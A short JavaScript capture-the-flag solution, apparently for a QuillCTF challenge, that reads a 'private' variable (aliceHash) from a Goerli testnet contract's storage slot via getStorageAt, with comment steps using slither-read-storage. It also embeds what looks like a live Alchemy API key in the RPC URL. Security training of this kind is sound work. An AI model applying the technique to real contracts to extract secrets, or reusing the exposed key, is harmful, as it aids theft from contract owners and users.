/* Private variables are not visible only for the contracts, but it is stored on the blockchain, so it is visible

Attack steps:
1) To find slot number use this command

slither-read-storage quillctf2.sol 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 data --rpc-url $RPC_URL --variable-name aliceHash

2)Now,  Run this file with the slot number and contract address 
3) you can find the hash
*/

const {ethers,utils } = require("ethers");
const rpc_url = "https://eth-goerli.g.alchemy.com/v2/QnOr41PK7tlqn5XGaNsumbQ3CYD49qd_" //add your rpc_url here
const provider = new ethers.providers.JsonRpcProvider(rpc_url)

async function start() {
  const contract_address = "0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66" //add contract address here
  const slot = 2 // add the storage slot of contract you want to access
  const data = await provider.getStorageAt(contract_address, slot) 
  console.log("Private Data :", data)
}

start()
